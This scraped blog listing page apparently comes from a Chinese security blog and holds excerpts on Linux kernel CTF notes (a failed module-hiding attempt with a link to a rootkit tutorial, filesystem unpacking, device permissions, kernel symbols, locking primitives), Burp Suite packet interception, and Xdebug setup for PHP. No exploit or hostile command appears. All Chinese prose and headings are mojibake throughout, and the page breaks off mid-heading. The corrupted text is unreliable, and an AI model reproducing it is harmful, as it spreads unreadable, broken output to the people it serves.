<p>è¿™ä¸¤ä¸ªå°±ä¸è®²äº†ï¼Œé¡¾åæ€ä¹‰ã€‚</p>

        <h1 id="åä¸€ã€å…¶ä»–çŸ¥è¯†"   >
          <a href="#åä¸€ã€å…¶ä»–çŸ¥è¯†" class="heading-link"><i class="fas fa-link"></i></a><a href="#åä¸€ã€å…¶ä»–çŸ¥è¯†" class="headerlink" title="åä¸€ã€å…¶ä»–çŸ¥è¯†"></a>åä¸€ã€å…¶ä»–çŸ¥è¯†</h1>
      
        <h2 id="1-å†…æ ¸æ¨¡å—éšè—"   >
          <a href="#1-å†…æ ¸æ¨¡å—éšè—" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å†…æ ¸æ¨¡å—éšè—" class="headerlink" title="1.å†…æ ¸æ¨¡å—éšè—"></a>1.å†…æ ¸æ¨¡å—éšè—</h2>
      <p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™é‡Œä¸æˆåŠŸï¼Œæ˜¾ç¤º</p>
<p><code> Unknown symbol module_mutex (err 0)</code></p>
<p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246749#h3-7" >ç®€æ˜“ Linux Rootkit ç¼–å†™å…¥é—¨æŒ‡åŒ—ï¼ˆä¸€ï¼‰ï¼šæ¨¡å—éšè—ä¸è¿›ç¨‹ææƒ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="2-æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#2-æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="2.æ–‡ä»¶ç³»ç»Ÿ"></a>2.æ–‡ä»¶ç³»ç»Ÿ</h2>
      
        <h3 id="1-SRV4æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#1-SRV4æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-SRV4æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="(1)SRV4æ–‡ä»¶ç³»ç»Ÿ"></a>(1)SRV4æ–‡ä»¶ç³»ç»Ÿ</h3>
      <p>ä¹Ÿå°±æ˜¯å¸¸è§çš„cpioåç¼€çš„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330101231165.png" alt="image-20220330101231165"></p>
<p>è¿™ä¸ªç›´æ¥å¸¸ç”¨è§£åŒ…æ‰“åŒ…å³å¯</p>

        <h3 id="2-ext4æ–‡ä»¶ç³»ç»Ÿ"   >
          <a href="#2-ext4æ–‡ä»¶ç³»ç»Ÿ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ext4æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="(2)ext4æ–‡ä»¶ç³»ç»Ÿ"></a>(2)ext4æ–‡ä»¶ç³»ç»Ÿ</h3>
      <p>linuxä¸‹æŒ‚è½½ä¿®æ”¹å³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo mount rootfs.ext4 mountpoint/</span><br><span class="line"><span class="built_in">cd</span> mountpoint/</span><br><span class="line"><span class="comment">#change somethin</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line">sudo umount ./mountpoint</span><br></pre></td></tr></table></div></figure>

<p>å¸¸è§çš„initå¯åŠ¨è„šæœ¬åœ¨<code>/etc/init.d/rcS</code>ä¸­</p>

        <h2 id="3-è®¾å¤‡æ“ä½œ"   >
          <a href="#3-è®¾å¤‡æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è®¾å¤‡æ“ä½œ" class="headerlink" title="3.è®¾å¤‡æ“ä½œ"></a>3.è®¾å¤‡æ“ä½œ</h2>
      <ul>
<li>è·å–è®¾å¤‡ä¿¡æ¯</li>
</ul>
<p>é€šè¿‡å‘½ä»¤<code>udevadm info -a -n /dev/tty</code>è·å–ç›¸å…³è®¾å¤‡ä¿¡æ¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171652853.png" alt="image-20220330171652853"></p>
<ul>
<li>ä¿®æ”¹è®¾å¤‡æƒé™</li>
</ul>
<p>å½“æˆ‘ä»¬æ— æ³•å¯¹è®¾å¤‡è¿›è¡Œæ“ä½œæ—¶ï¼Œå¯èƒ½æ˜¯è¢«è®¾ç½®äº†æƒé™ï¼Œå¯ä»¥é€šè¿‡<code>/etc/udev/rules.d/</code>ä¸‹æŸ¥çœ‹è®¾ç½®çš„ä¸€äº›è§„åˆ™</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171342307.png"></p>
<p>æŸ¥çœ‹ç›¸å…³çš„å†…å®¹ï¼Œå³æŒ‡å®šç›¸å…³è®¾å¤‡åå¯ä»¥è®¾ç½®å…¶ç±»ä¼¼ç”¨æˆ·ç»„<code>GROUP</code>æˆ–è€…æƒé™<code>MODE</code>ç­‰å†…å®¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330171405407.png" alt="image-20220330171405407"></p>
<ul>
<li>è¯»å–</li>
</ul>
<p>ç›´æ¥<code>cat /dev/DEV_NAME</code>ç›¸å½“äº<code>open_read_close</code>è¿™ä¸ªè®¾å¤‡</p>

        <h2 id="4-è·å–å†…æ ¸ç¬¦å·"   >
          <a href="#4-è·å–å†…æ ¸ç¬¦å·" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-è·å–å†…æ ¸ç¬¦å·" class="headerlink" title="4.è·å–å†…æ ¸ç¬¦å·"></a>4.è·å–å†…æ ¸ç¬¦å·</h2>
      <p>å½“æˆ‘ä»¬æ‹¿åˆ°ä¸€ä¸ª<code>bzImage</code>æˆ–è€…æ— ç¬¦å·çš„<code>vmlinux</code>æ–‡ä»¶æ—¶ï¼Œæƒ³è¦è·å–ç¬¦å·ä¸€èˆ¬åªæœ‰ä»¥ä¸‹ä¸¤ç§</p>

        <h3 id="1-å¯åŠ¨å†…æ ¸"   >
          <a href="#1-å¯åŠ¨å†…æ ¸" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯åŠ¨å†…æ ¸" class="headerlink" title="(1)å¯åŠ¨å†…æ ¸"></a>(1)å¯åŠ¨å†…æ ¸</h3>
      <p>æˆ‘ä»¬åˆ©ç”¨busyboxåˆ¶ä½œæ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åä½¿ç”¨qemuåŠ è½½å¯åŠ¨å†…æ ¸ï¼Œå¯åŠ¨ä¹‹ååœ¨<code>/proc/kallsyms</code>ä¿å­˜æ‰€æœ‰åœ°å€ï¼Œç›´æ¥catæŸ¥çœ‹å³å¯ã€‚</p>

        <h3 id="2-ä½¿ç”¨å·¥å…·"   >
          <a href="#2-ä½¿ç”¨å·¥å…·" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä½¿ç”¨å·¥å…·" class="headerlink" title="(2)ä½¿ç”¨å·¥å…·"></a>(2)ä½¿ç”¨å·¥å…·</h3>
      <p>æœ‰ä¸ªå·¥å…·<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf" >vmlinux-to-elf</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼Œè¿™ä¸ªè¿˜æ˜¯å¾ˆå¥½ä½¿çš„ï¼Œå¯ä»¥ç›´æ¥è·å¾—å¸¦ç¬¦å·çš„<code>vmlinux</code>æ–‡ä»¶</p>

        <h2 id="5-äº’æ–¥é”å’Œä¿¡å·é‡"   >
          <a href="#5-äº’æ–¥é”å’Œä¿¡å·é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-äº’æ–¥é”å’Œä¿¡å·é‡" class="headerlink" title="5.äº’æ–¥é”å’Œä¿¡å·é‡"></a>5.äº’æ–¥é”å’Œä¿¡å·é‡</h2>
      
        <h3 id="1-äº’æ–¥é”"   >
          <a href="#1-äº’æ–¥é”" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-äº’æ–¥é”" class="headerlink" title="(1)äº’æ–¥é”"></a>(1)äº’æ–¥é”</h3>
      <p>ç”¨äºçº¿ç¨‹äº’æ–¥ï¼Œä¸€ä¸ªäº’æ–¥é”çš„åŠ é”å’Œè§£é”å¿…é¡»ç”±åŒä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œæ˜¯ä¸ºäº†é˜²æ­¢å¯¹ä¸€å—å†…å­˜çš„åŒæ—¶è¯»å†™ç­‰é—®é¢˜ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/mutex.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutext</span> <span class="title">mtx</span>;</span></span><br><span class="line">mutex_init(&amp;mtx);<span class="comment">//åˆå§‹åŒ–äº’æ–¥é”</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(mutex_lock_interruptible(&amp;mtx))<span class="comment">//-EINTR(é€€å‡ºè¿›ç¨‹)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//è¿›å…¥ç­‰å¾…</span></span><br><span class="line"><span class="comment">//.....//</span></span><br><span class="line">mutex_unlock(&amp;mtx);</span><br></pre></td></tr></table></div></figure>




        <h3 id="2-ä¿¡å·é‡"   >
          <a href="#2-ä¿¡å·é‡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¿¡å·é‡" class="headerlink" title="(2)ä¿¡å·é‡"></a>(2)ä¿¡å·é‡</h3>
      <p>ç”¨äºçº¿ç¨‹åŒæ­¥ï¼Œåˆç†ä½¿ç”¨å…¬å…±èµ„æºã€‚æ¯”å¦‚ä¸€ä¸ªèµ„æºåªæœ‰5ä»½ï¼Œæ¯å½“ä¸€ä¸ªçº¿ç¨‹è·å–è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å°±å‡ä¸€ï¼Œå½“5ä¸ªçº¿ç¨‹éƒ½è·å¾—è¯¥èµ„æºæ—¶ï¼Œä¿¡å·é‡å‡ä¸º0ï¼Œå…¶ä»–çº¿ç¨‹å°±ä¸èƒ½å†è·å–è¯¥èµ„æºï¼Œå¤„äºç­‰å¾…çŠ¶æ€ï¼Œé˜²æ­¢æ­»é”ã€‚</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/semaphore.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> <span class="title">sema</span>;</span></span><br><span class="line"></span><br><span class="line">sema_init(&amp;sema,<span class="number">1</span>);<span class="comment">//åˆå§‹åŒ–ä¿¡å·é‡ï¼Œå°†èµ„æºé‡è®¾ç½®ä¸º1</span></span><br><span class="line"><span class="keyword">if</span>(down_interruptible(&amp;sema))<span class="comment">//-EINTR(é€€å‡ºè¿›ç¨‹)</span></span><br><span class="line">	<span class="keyword">return</span> -ERESTARTSYS;<span class="comment">//è¿›å…¥ç­‰å¾…</span></span><br><span class="line"><span class="comment">//......//</span></span><br><span class="line">up(&amp;sema)</span><br></pre></td></tr></table></div></figure>




        <h2 id="6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨"   >
          <a href="#6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨" class="headerlink" title="6.ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨"></a>6.ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨</h2>
      
        <h3 id="1-ä¼ å‚çº¦å®š"   >
          <a href="#1-ä¼ å‚çº¦å®š" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä¼ å‚çº¦å®š" class="headerlink" title="(1)ä¼ å‚çº¦å®š"></a>(1)ä¼ å‚çº¦å®š</h3>
      <ul>
<li>32ä½ï¼šEBXã€ECXã€EDXã€ESIã€EDIã€EBP</li>
<li>64ä½ï¼šRDIã€RSIã€RDï¼¸ã€R10ã€R8ã€R9</li>
</ul>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/09/Burpsuite%E4%BD%BF%E7%94%A8/">Burpsuiteä½¿ç”¨</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€é…ç½®"   >
          <a href="#ä¸€ã€é…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€é…ç½®" class="headerlink" title="ä¸€ã€é…ç½®"></a>ä¸€ã€é…ç½®</h1>
      
        <h2 id="1-é…ç½®æµè§ˆå™¨ä»£ç†"   >
          <a href="#1-é…ç½®æµè§ˆå™¨ä»£ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-é…ç½®æµè§ˆå™¨ä»£ç†" class="headerlink" title="1.é…ç½®æµè§ˆå™¨ä»£ç†"></a>1.é…ç½®æµè§ˆå™¨ä»£ç†</h2>
      
        <h3 id="1-å®‰è£…"   >
          <a href="#1-å®‰è£…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®‰è£…" class="headerlink" title="(1)å®‰è£…"></a>(1)å®‰è£…</h3>
      <p>Edgeå®‰è£…æ’ä»¶Proxy SwitchyOmega</p>

        <h3 id="3-è®¾ç½®"   >
          <a href="#3-è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è®¾ç½®" class="headerlink" title="(3)è®¾ç½®"></a>(3)è®¾ç½®</h3>
      <p>è¿›å…¥é€‰é¡¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091240977.png" alt="image-20220109124055943"></p>
<p>é…ç½®å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091241223.png" alt="image-20220109124123157"></p>

        <h2 id="2-é…ç½®BurpSuite"   >
          <a href="#2-é…ç½®BurpSuite" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é…ç½®BurpSuite" class="headerlink" title="2.é…ç½®BurpSuite"></a>2.é…ç½®BurpSuite</h2>
      <p>Proxy-&gt;Options</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091242646.png" alt="image-20220109124203603"></p>
<p>æ²¡æœ‰çš„å¯ä»¥ç‚¹æ—è¾¹çš„AddæŒ‰é’®æ·»åŠ ã€‚</p>

        <h1 id="äºŒã€ä½¿ç”¨"   >
          <a href="#äºŒã€ä½¿ç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ä½¿ç”¨" class="headerlink" title="äºŒã€ä½¿ç”¨"></a>äºŒã€ä½¿ç”¨</h1>
      
        <h2 id="1-æŠ“åŒ…"   >
          <a href="#1-æŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æŠ“åŒ…" class="headerlink" title="1.æŠ“åŒ…"></a>1.æŠ“åŒ…</h2>
      
        <h3 id="1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†"   >
          <a href="#1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Edgeæµè§ˆå™¨å¼€å¯ä»£ç†" class="headerlink" title="(1)Edgeæµè§ˆå™¨å¼€å¯ä»£ç†"></a>(1)Edgeæµè§ˆå™¨å¼€å¯ä»£ç†</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091806742.png" alt="image-20220109180624711"></p>
<p>é€‰ä¸­å¦‚å›¾ä»£ç†</p>
<p>ç„¶åç»§ç»­ç‚¹å‡»ç½‘é¡µ</p>

        <h3 id="2-Burpsuiteå¼€å¯"   >
          <a href="#2-Burpsuiteå¼€å¯" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Burpsuiteå¼€å¯" class="headerlink" title="(2)Burpsuiteå¼€å¯"></a>(2)Burpsuiteå¼€å¯</h3>
      <p>Burpsuitä¸­</p>
<p>Proxy-&gt;Interceptå¤„ï¼Œå¦‚æœç‚¹å‡»å¦‚ä¸‹æŒ‰é’®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091809028.png" alt="image-20220109180945990"></p>
<p>é‚£ä¹ˆæ¯æ¥æ”¶ä¸€ä¸ªåŒ…ï¼ŒBurpSuiteéƒ½ä¼šæ‹¦æˆªï¼Œéœ€è¦ç‚¹å‡»Frowardç»§ç»­ï¼Œæˆ–è€…ä¸¢å¼ƒDropè¯¥åŒ…ï¼Œé¡µé¢æ‰ä¼šç»§ç»­åŠ è½½ã€‚</p>
<p>ç„¶ååˆ°Target-&gt;Site mapå¤„ï¼Œå³å¯çœ‹åˆ°æ‹¦æˆªçš„æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201091812502.png" alt="image-20220109181204449"></p>

        <h2 id="2-æ”¹åŒ…"   >
          <a href="#2-æ”¹åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ”¹åŒ…" class="headerlink" title="2.æ”¹åŒ…"></a>2.æ”¹åŒ…</h2>
      
        <h3 id="1-å…ˆæŠ“åŒ…"   >
          <a href="#1-å…ˆæŠ“åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å…ˆæŠ“åŒ…" class="headerlink" title="(1)å…ˆæŠ“åŒ…"></a>(1)å…ˆæŠ“åŒ…</h3>
      <p>é¦–å…ˆæµè§ˆå™¨å¼€å¯ä»£ç†ï¼ŒBurpSuiteæŠ“åˆ°åŒ…</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424692.png" alt="image-20220111141339457"></p>

        <h3 id="2-å‘é€åˆ°Repeater"   >
          <a href="#2-å‘é€åˆ°Repeater" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å‘é€åˆ°Repeater" class="headerlink" title="(2)å‘é€åˆ°Repeater"></a>(2)å‘é€åˆ°Repeater</h3>
      <p>ç„¶åå°†åŒ…å‘é€åˆ°<code>repeater</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424737.png" alt="image-20220111141424655"></p>
<p>åœ¨Repeateræœ€æ–°å‡ºç°çš„ä¸€éƒ¨åˆ†å°±æ˜¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201111424733.png" alt="image-20220111141531436"></p>
<p>ä¿®æ”¹ç„¶åä½¿ç”¨ç‚¹å‡»Goå³å¯å‘é€ä¿®æ”¹ä¹‹åçš„åŒ…ï¼ŒResponseæ¥æ”¶åé¦ˆçš„åŒ…å¹¶è§£æ</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHPç¯å¢ƒæ­å»º</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-02-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€è°ƒè¯•æ­å»º"   >
          <a href="#ä¸€ã€è°ƒè¯•æ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€è°ƒè¯•æ­å»º" class="headerlink" title="ä¸€ã€è°ƒè¯•æ­å»º"></a>ä¸€ã€è°ƒè¯•æ­å»º</h1>
      
        <h2 id="ğŸ”ºWindowsç‰ˆæœ¬"   >
          <a href="#ğŸ”ºWindowsç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºWindowsç‰ˆæœ¬" class="headerlink" title="ğŸ”ºWindowsç‰ˆæœ¬"></a>ğŸ”ºWindowsç‰ˆæœ¬</h2>
      
        <h2 id="1-å‰ç½®å®‰è£…"   >
          <a href="#1-å‰ç½®å®‰è£…" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‰ç½®å®‰è£…" class="headerlink" title="1.å‰ç½®å®‰è£…"></a>1.å‰ç½®å®‰è£…</h2>
      <p>phpstorm+phpStudy</p>
<p>è¿™ä¸¤ä¸ªéœ€è¦å…ˆè£…å¥½ï¼Œä¹‹ååˆ©ç”¨phpStudyä¸­è‡ªå¸¦çš„xdebugæ¥è°ƒè¯•</p>

        <h2 id="2-phpStudyè®¾ç½®"   >
          <a href="#2-phpStudyè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-phpStudyè®¾ç½®" class="headerlink" title="2.phpStudyè®¾ç½®"></a>2.phpStudyè®¾ç½®</h2>
      
        <h3 id="1-phpç‰ˆæœ¬"   >
          <a href="#1-phpç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-phpç‰ˆæœ¬" class="headerlink" title="(1)phpç‰ˆæœ¬"></a>(1)phpç‰ˆæœ¬</h3>
      <p>è¿™é‡Œæˆ‘çš„phpé€‰æ‹©çš„æ˜¯å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071053181.png" alt="image-20220107105326110"></p>

        <h3 id="2-æ‰“å¼€xdebug"   >
          <a href="#2-æ‰“å¼€xdebug" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ‰“å¼€xdebug" class="headerlink" title="(2)æ‰“å¼€xdebug"></a>(2)æ‰“å¼€xdebug</h3>
      <p>å•å‡»è®¾ç½®-&gt;æ‰©å±•ç»„ä»¶ï¼Œè®¾ç½®å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071054040.png" alt="image-20220107105424985"></p>

        <h3 id="3-ä¿®æ”¹php-ini"   >
          <a href="#3-ä¿®æ”¹php-ini" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä¿®æ”¹php-ini" class="headerlink" title="(3)ä¿®æ”¹php.ini"></a>(3)ä¿®æ”¹php.ini</h3>
      <p>ç„¶åä¸»ç•Œé¢è®¾ç½®-&gt;php.ini-&gt;å•å‡»å¯¹åº”ç‰ˆæœ¬ï¼Œå³å¯æ‰“å¼€php.inié…ç½®æ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071055085.png" alt="image-20220107105552036"></p>
<p>æ‰“å¼€ä¹‹åï¼Œåœ¨æœ€ä¸‹é¢çš„xdebugè®¾ç½®å¦‚ä¸‹</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Xdebug]</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br><span class="line">zend_extension=D:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.trace_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace</span><br><span class="line">xdebug.profiler_enable=On</span><br><span class="line">xdebug.profiler_output_dir=D:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler</span><br><span class="line">xdebug.remote_enable=On</span><br><span class="line">xdebug.remote_host=localhost</span><br><span class="line">xdebug.remote_port=9000</span><br><span class="line">xdebug.remote_handler=dbgp</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/baocheng/p/5775938.html" >https://www.cnblogs.com/baocheng/p/5775938.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>  ç›¸å…³çš„ä¼šæ›´åŠ è¯¦ç»†ã€‚</p>
<p>ä¸»è¦æ˜¯è®¾ç½®<code>xdebug.remote_handler</code>ï¼Œ<code>xdebug.remote_port</code>ï¼Œ<code>xdebug.remote_host</code>ï¼Œ<code>xdebug.profiler_enable</code>ï¼Œ<code>xdebug.idekey</code>ï¼Œ<code>xdebug.remote_enable</code></p>

        <h3 id="4-ç½‘ç«™è·¯å¾„è®¾ç½®"   >
          <a href="#4-ç½‘ç«™è·¯å¾„è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç½‘ç«™è·¯å¾„è®¾ç½®" class="headerlink" title="(4)ç½‘ç«™è·¯å¾„è®¾ç½®"></a>(4)ç½‘ç«™è·¯å¾„è®¾ç½®</h3>
      <p>ä¸»ç•Œé¢ç½‘ç«™-&gt;ç®¡ç†-&gt;ä¿®æ”¹-&gt;æ ¹ç›®å½•ï¼Œç„¶åè®¾ç½®ä¸ºåœ¨phpStormä¸­å­˜æ”¾phpæ–‡ä»¶çš„ç›®å½•ï¼Œæ²¡æœ‰çš„å¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ª</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071114807.png" alt="image-20220107111415751"></p>

        <h3 id="5-å¼€å¯æœåŠ¡"   >
          <a href="#5-å¼€å¯æœåŠ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å¼€å¯æœåŠ¡" class="headerlink" title="(5)å¼€å¯æœåŠ¡"></a>(5)å¼€å¯æœåŠ¡</h3>
      <p>phpStudyä¸­å¼€å¯å¯¹åº”çš„ç½‘ç«™æœåŠ¡å³å¯</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071128163.png" alt="image-20220107112835096"></p>

        <h2 id="3-phpstormè®¾ç½®"   >
          <a href="#3-phpstormè®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-phpstormè®¾ç½®" class="headerlink" title="3.phpstormè®¾ç½®"></a>3.phpstormè®¾ç½®</h2>
      
        <h3 id="1-PHPç‰ˆæœ¬é€‰æ‹©"   >
          <a href="#1-PHPç‰ˆæœ¬é€‰æ‹©" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-PHPç‰ˆæœ¬é€‰æ‹©" class="headerlink" title="(1)PHPç‰ˆæœ¬é€‰æ‹©"></a>(1)PHPç‰ˆæœ¬é€‰æ‹©</h3>
      <p>ç‰ˆæœ¬é€‰æ‹©ä¹‹å‰æˆ‘ä»¬çš„è®¾ç½®å¥½çš„ç›¸å…³ç‰ˆæœ¬</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071103174.png" alt="image-20220107110300128"></p>
<p>è¿™é‡Œçš„CLI interpreteréœ€è¦é€‰æ‹©phpStudyä¸­çš„phpï¼Œç‚¹å‡»æ—è¾¹çš„<code>...</code>æŒ‰é’®ï¼Œæ‰¾åˆ°å¯¹åº”çš„php.exeæ·»åŠ å³å¯ï¼Œå¤§å¤šçš„è·¯å¾„å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071104002.png" alt="image-20220107110410950"></p>

        <h3 id="2-xdebugé…ç½®"   >
          <a href="#2-xdebugé…ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-xdebugé…ç½®" class="headerlink" title="(2)xdebugé…ç½®"></a>(2)xdebugé…ç½®</h3>
      <p>æ‰“å¼€phpstormï¼Œæ‰“å¼€setting-&gt;PHP-&gt;Debugï¼Œxdebugé…ç½®å¦‚ä¸‹ï¼Œä¸»è¦æ˜¯ç«¯å£å¯¹åº”</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071100474.png" alt="image-20220107110012400"></p>
<p>PHP-&gt;Debug-&gt;DBGp Proxyï¼Œè¿›è¡Œç›¸å…³è®¾ç½®</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201071106492.png" alt="image-20220107110614445"></p>

        <h3 id="3-æœåŠ¡å™¨ç«¯é…ç½®"   >
